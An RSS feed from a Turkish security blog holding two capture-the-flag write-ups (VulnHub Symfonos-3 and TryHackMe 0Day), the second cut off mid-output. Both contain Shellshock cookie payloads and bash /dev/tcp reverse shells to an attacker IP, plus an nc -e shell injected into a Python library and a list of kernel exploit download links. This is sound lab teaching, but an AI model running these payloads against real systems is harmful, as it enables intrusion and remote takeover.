<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Cyber Security Blog</title>
        <link>https://barcode91.github.io/posts/</link>
        <description>Recent content in Posts on Cyber Security Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>tr</language>
        <lastBuildDate>Tue, 10 Nov 2020 20:17:56 +0300</lastBuildDate>
        <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>VULNHUB Symfonos-3 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-3-write-up/</link>
            <pubDate>Tue, 10 Nov 2020 20:17:56 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/vulnhub-symfonos-3-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Vulnhub &amp;lsquo;da yer alan Symfonos-3 adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.
netdiscover -i eth1  Nmap ile port ve servis taramasÄ± yapÄ±lÄ±r.
sudo nmap -sV -sC -p- 192.168.56.122  Ftp servisi anonymous eriÅŸime aÃ§Ä±k deÄŸildir. AyrÄ±ca servis sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸan bir exploit bulunamamÄ±ÅŸtÄ±r.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazÄ±mda sizlere <a href="https://www.vulnhub.com/entry/symfonos-31,332/">Vulnhub</a> &lsquo;da yer alan Symfonos-3  adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Makina kalÄ±p dosyasÄ± siteden indirildikten sonra sanallaÅŸtÄ±rma yazÄ±lÄ±mlarÄ± tarafÄ±ndan import edilir ve Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. DHCP servisi tarafÄ±ndan atanan ip adresinin tespit edilmesi iÃ§in netdiscover aracÄ± ile aÄŸda tarama yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nmap ile port ve servis taramasÄ± yapÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.122
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Ftp servisi anonymous eriÅŸime aÃ§Ä±k deÄŸildir. AyrÄ±ca servis sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸan bir exploit bulunamamÄ±ÅŸtÄ±r. Bilgi toplama iÅŸlemine 80. porttan devam edilir.</p>

    <img src="/images/vulnhub/symfonos3/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Gobuster aracÄ± ile web dizininde tarama gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">gobuster dir -u http://192.168.56.122 -w /usr/share/wordlists/dirb/big.txt
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/g1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>/gate</em> dizinine gidilir. Dizinde yapÄ±lan tarama sonucunda bir bilgi elde edilememektedir.</p>

    <img src="/images/vulnhub/symfonos3/website2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>KeÅŸif iÅŸlemine <em><strong>/cgi-bin</strong></em> dizini ile devam edilir. Daha bÃ¼yÃ¼k bir wordlist ile dizin taramasÄ± yapÄ±ldÄ±ÄŸÄ±nda underworld dizini tespit edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.122/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">50</span>
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/g2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>/cgi-bin/underworld</strong></em> sayfasÄ±na istek atÄ±ldÄ±ÄŸÄ±nda zaman bilgisi ve cpu kullanÄ±m durumunu gÃ¶steren bir sayfa gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/symfonos3/underworld.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>/cgi-bin dizinine Ã§alÄ±ÅŸan bir uygulama olmasÄ± akÄ±llara hemen shellshock zafiyetini getirmektedir. Hemen burpsuite ile sayfa test edilir.</em></p>
<pre><code>Cookie: () { :;}; echo;echo &quot;test&quot;
</code></pre>
    <img src="/images/vulnhub/symfonos3/sh1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Cookie ile gÃ¶nderilen komutlarÄ±n Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ± gÃ¶rÃ¼lmektedir. Reverse shell baÄŸlantÄ±sÄ± iÃ§in gerekli dÃ¼zenlemeler yapÄ±lÄ±r.</p>
<pre><code>Cookie: () { :;}; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.56.105/4444 0&gt;&amp;1
</code></pre><p>
    <img src="/images/vulnhub/symfonos3/sh2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<br>

    <img src="/images/vulnhub/symfonos3/cerberu.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />

</p>
<p>LinEnum betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±larak sistem hakkÄ±nda bilgi toplanÄ±lÄ±r. Ä°ÅŸlem sonucunda <strong>tcpdump</strong> aracÄ±nÄ±n root yetkisi ile Ã§alÄ±ÅŸtÄ±rÄ±labildiÄŸi gÃ¶rÃ¼lmektedir.</p>

    <img src="/images/vulnhub/symfonos3/getcap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>tcpdump aracÄ± ile loopback arayÃ¼zÃ¼nde 21. porttan yapÄ±lan iletiÅŸim dinlenir. Ftp protokolÃ¼ clear text olarak haberleÅŸme saÄŸladÄ±ÄŸÄ±ndan paket iÃ§eriklerini okumak kolay olmaktadÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">tcpdump -i lo -n port 21
</code></pre></div><pre><code>tcpdump -i lo -n port 21
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
13:22:01.471858 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [S], seq 3896082630, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 0,nop,wscale 7], length 0
13:22:01.471873 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [S.], seq 558047581, ack 3896082631, win 43690, options [mss 65495,sackOK,TS val 221098 ecr 221098,nop,wscale 7], length 0
13:22:01.471886 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 1, win 342, options [nop,nop,TS val 221098 ecr 221098], length 0
13:22:01.474934 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 1:56, ack 1, win 342, options [nop,nop,TS val 221099 ecr 221098], length 55: FTP: 220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
13:22:01.475029 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.475380 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 221099 ecr 221099], length 12: FTP: USER hades
13:22:01.475391 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [.], ack 13, win 342, options [nop,nop,TS val 221099 ecr 221099], length 0
13:22:01.476653 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 221100 ecr 221099], length 33: FTP: 331 Password required for hades
13:22:01.476747 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 221100 ecr 221100], length 23: FTP: PASS PTpZTfU4vxgzvRBE
13:22:01.490197 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 89:115, ack 36, win 342, options [nop,nop,TS val 221102 ecr 221100], length 26: FTP: 230 User hades logged in
13:22:01.490404 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [P.], seq 36:51, ack 115, win 342, options [nop,nop,TS val 221102 ecr 221102], length 15: FTP: CWD /srv/ftp/
13:22:01.491515 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [P.], seq 115:143, ack 51, win 342, options [nop,nop,TS val 221103 ecr 221102], length 28: FTP: 250 CWD command successful
13:22:01.495524 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [F.], seq 51, ack 143, win 342, options [nop,nop,TS val 221104 ecr 221103], length 0
13:22:01.495852 IP 127.0.0.1.21 &gt; 127.0.0.1.33106: Flags [F.], seq 143, ack 52, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
13:22:01.495870 IP 127.0.0.1.33106 &gt; 127.0.0.1.21: Flags [.], ack 144, win 342, options [nop,nop,TS val 221104 ecr 221104], length 0
</code></pre><p>Ä°ÅŸlem sonucunda <strong>hades</strong> kullanÄ±cÄ±sÄ±na ait hesap bilgileri elde edilir. <code>PASS PTpZTfU4vxgzvRBE</code> Elde edilen parola ile ssh baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<pre><code>ssh hades@192.168.56.122
</code></pre><h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Hades kullanÄ±cÄ±sÄ± ile LinEnum betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda yetki yÃ¼kseltme iÃ§in herhangi bir bilgi elde edilemektedir. <em>Ä°lk olarak hades kullanÄ±cÄ±sÄ±na ait tÃ¼m dosyalar tespit edilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cerberus@symfonos3:/home$ find / -user hades -type f 2&gt;/dev/null
/srv/ftp/statuscheck.txt
/home/hades/.bashrc
/home/hades/.profile
/home/hades/.bash_logout
/home/hades/.wget-hsts
</code></pre></div><p><em>Daha sonra hades grubunun eriÅŸime aÃ§Ä±k olan dosyalar tespit edilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find / -group hades -type f 2&gt;/dev/null
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/hadesgr.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><strong>/opt/ftpclient</strong> dizini altÄ±nda bir python dosyasÄ± dikkat Ã§ekmektedir. Ä°lk olarak dosya iÃ§eriÄŸine gÃ¶z atÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib

ftp <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>)
ftp<span style="color:#f92672">.</span>login(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hades&#39;</span>, passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;PTpZTfU4vxgzvRBE&#39;</span>)

ftp<span style="color:#f92672">.</span>cwd(<span style="color:#e6db74">&#39;/srv/ftp/&#39;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/client/statuscheck.txt&#39;</span>
    ftp<span style="color:#f92672">.</span>storbinary(<span style="color:#e6db74">&#39;STOR &#39;</span><span style="color:#f92672">+</span>filename, open(filename, <span style="color:#e6db74">&#39;rb&#39;</span>))
    ftp<span style="color:#f92672">.</span>quit()

upload()
</code></pre></div><p>tcpdump ile yakaladÄ±ÄŸÄ±mÄ±z trafiÄŸe sebep olan uygulama olduÄŸu gÃ¶rÃ¼lmektedir. ftplib kÃ¼tÃ¼phanesine kod enjeckte ederek yetki yÃ¼kseltilir. <em>(Yetki yÃ¼kseltme iÅŸlemi kÃ¼tÃ¼phane dosyasÄ± root yetkisinde olmasÄ±ndan kaynaklÄ±dÄ±r.)</em> Ä°lk olarak kÃ¼tÃ¼phanenin dizini tespit edilir.</p>

    <img src="/images/vulnhub/symfonos3/libsearch.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>gods</strong> grubuna Ã¼ye kullanÄ±cÄ±larÄ±n dosya Ã¼zerinde yazma yetkisi bulunmaktadÄ±r. <code>id</code> komutu ile Ã¼ye olduÄŸumuz gruplarÄ± kontrol ettiÄŸimizde hades kullanÄ±cÄ±sÄ±nÄ±n gods grubuna Ã¼ye olduÄŸu gÃ¶rÃ¼lmektedir.</em></p>

    <img src="/images/vulnhub/symfonos3/id.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Komutlar sÄ±ra ile girilerek ftplib.py dosyasÄ± iÃ§eriÄŸi shell alacak ÅŸekilde deÄŸiÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;import os&#34;</span> &gt; ftplib.py
echo <span style="color:#e6db74">&#39;os.system(&#34;/bin/nc -e /bin/bash 192.168.56.105 3333&#34;)&#39;</span> &gt;&gt; ftplib.py
</code></pre></div>
    <img src="/images/vulnhub/symfonos3/ftplib.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nc ile 3333 numaralÄ± port dinlenir. Ftpclient.py dosyasÄ± Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda hata olmasÄ±na raÄŸmen terminal baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<p>
    <img src="/images/vulnhub/symfonos3/run.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<br>

    <img src="/images/vulnhub/symfonos3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />

</p>
<p>/root dizini altÄ±nda yer alan proof.txt dosyasÄ± gÃ¶rÃ¼ntÃ¼lenerek makina Ã§Ã¶zÃ¼mleme iÅŸlemi tamamlanÄ±r.</p>

    <img src="/images/vulnhub/symfonos3/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em>UmarÄ±m faydalÄ± olmuÅŸtur. BaÅŸka bir Ã§Ã¶zÃ¼mde gÃ¶rÃ¼ÅŸmek Ã¼zere Allahâ€™a emanet olunâ€¦</em></p>
]]></content>
        </item>
        
        <item>
            <title>THM 0Day Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/thm-0day-write-up/</link>
            <pubDate>Sun, 08 Nov 2020 14:58:36 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/thm-0day-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki 0Day adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Nmap ile port taramasÄ± gerÃ§ekleÅŸtirilir.
sudo nmap -sV -sC 10.10.119.248  KeÅŸif iÅŸlemine 80 portunda Ã§alÄ±ÅŸan web servis Ã¼zerinden devam edilir.
Web sayfasÄ± kaynak kodunda herhangi bir bilgi elde edilememektedir. Gobuster ile dizin taramasÄ± gerÃ§ekleÅŸtirilir.
gobuster dir -u http://10.10.119.248/ -w /usr/share/wordlists/dirb/big.txt -t 10  Epey ilginÃ§ dizinler tespit edilmektedir. /admin, /uploads, /cgi-bin dizinlerine tarayÄ±cÄ± ile istek atÄ±ldÄ±ÄŸÄ±nda boÅŸ sayfa ile karÅŸÄ±laÅŸÄ±lmaktadÄ±r.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazÄ±mda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/0day">0Day</a> adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile port taramasÄ± gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">sudo nmap -sV -sC 10.10.119.248
</code></pre></div>
    <img src="/images/thm/0Day/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>KeÅŸif iÅŸlemine 80 portunda Ã§alÄ±ÅŸan web servis Ã¼zerinden devam edilir.</p>

    <img src="/images/thm/0Day/website.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Web sayfasÄ± kaynak kodunda herhangi bir bilgi elde edilememektedir. Gobuster ile dizin taramasÄ± gerÃ§ekleÅŸtirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">gobuster dir -u http://10.10.119.248/ -w /usr/share/wordlists/dirb/big.txt -t 10
</code></pre></div>
    <img src="/images/thm/0Day/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Epey ilginÃ§ dizinler tespit edilmektedir. <em><strong>/admin, /uploads, /cgi-bin</strong></em> dizinlerine tarayÄ±cÄ± ile istek atÄ±ldÄ±ÄŸÄ±nda boÅŸ sayfa ile karÅŸÄ±laÅŸÄ±lmaktadÄ±r.</p>
<p>Robots.txt sayfasÄ±:</p>

    <img src="/images/thm/0Day/robots.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>secret sayfasÄ±:</p>

    <img src="/images/thm/0Day/secret.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Backup sayfasÄ±nda ssh private anahtarÄ± yer almaktadÄ±r. Ama malesef anahtar encrypt edilmiÅŸ halde olduÄŸundan decrypt edilmeden kullanÄ±amaz. Åimdilik keÅŸif aÅŸamasÄ±nda devam edilir.</p>

    <img src="/images/thm/0Day/backuppage.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p><em><strong>/cgi-bin</strong></em> dizini dikkatleri celbetmektedir. Nikto ile web sayfasÄ± taranÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">nikto --url http://10.10.119.248/ 
</code></pre></div><p>Tarama sonucunda <em><strong>shellshock</strong></em> zafiyeti tespit edilmiÅŸtir. <em>Zafiyet kÄ±saca hedef sistemde web sayfalarÄ± tarafÄ±ndan gÃ¶nderilen shell komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmayÄ± saÄŸlamaktadÄ±r. (GNU Bash Remote Code Execution GÃ¼venlik AÃ§Ä±ÄŸÄ±)</em></p>

    <img src="/images/thm/0Day/nikto.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Burada zafiyete sebep olan test.cgi dosyasÄ± burpsuite aracÄ± kullanÄ±larak ilk etapta test edilir.</p>

    <img src="/images/thm/0Day/shellshock1.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ Ã¼zere yapÄ±lan isteÄŸe &ldquo;hello Word&rdquo; cevabÄ± dÃ¶ndÃ¼rmektedir. Zafiyet http baÅŸlÄ±ÄŸÄ±ndaki cookie, useragent gibi parametler manipÃ¼le edilerek sÃ¶mÃ¼rÃ¼lebilir. Burada cookie bilgisi kullanÄ±larak zafiyet sÃ¶mÃ¼rÃ¼lmektedir.</p>
<p>Http baÅŸlÄ±ÄŸÄ±na Cookie bilgisi eklenerek test edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Cookie: () { :;}; echo;echo &#34;test&#34;
</code></pre></div>
    <img src="/images/thm/0Day/shellshock2.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Hedef sistemde kod Ã§alÄ±ÅŸtÄ±rÄ±labildiÄŸi tespit edilmektedir. Reverse shell baÄŸlantÄ±sÄ±nÄ± saÄŸlayacak shell komutu cookie bilgisine eklenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Cookie: () { :;}; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.9.62.67/4444 0&gt;&amp;1
</code></pre></div>
    <img src="/images/thm/0Day/shellshock3.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>Nc ile dinlenen porta terminal baÄŸlantÄ±sÄ± gerÃ§ekleÅŸir.</p>

    <img src="/images/thm/0Day/reverseshell.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>/home dizini altÄ±nda yer alan kullanÄ±cÄ± dizinleri kontrol edilir. Ryan dizini altÄ±nda user.txt dosyasÄ± okunur.</p>

    <img src="/images/thm/0Day/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Hedef sistemde hakkÄ±nda bilgi toplamak Ã¼zere LinEnum.sh betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. Betik sonucunda kernel sÃ¼rÃ¼mÃ¼nÃ¼n eski olduÄŸu tespit edilir.</p>
<p>Bu kernel sÃ¼rÃ¼mÃ¼nÃ¼nde yetki yÃ¼kseltmek Ã¼zere kullanÄ±labailecek exploitleri tespit etmek iÃ§in   <a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a> betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. <em>(Betiklerin localden hedef sisteme nasÄ±l atÄ±lacaÄŸÄ± ile ilgili eski write-uplara bakabilirsiniz.)</em></p>
<pre><code>www-data@ubuntu:/tmp$ chmod +x suggester.sh
chmod +x suggester.sh
www-data@ubuntu:/tmp$ ./suggester.sh
./suggester.sh

Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

74 kernel space exploits
45 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses &quot;Stack Clash&quot; technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
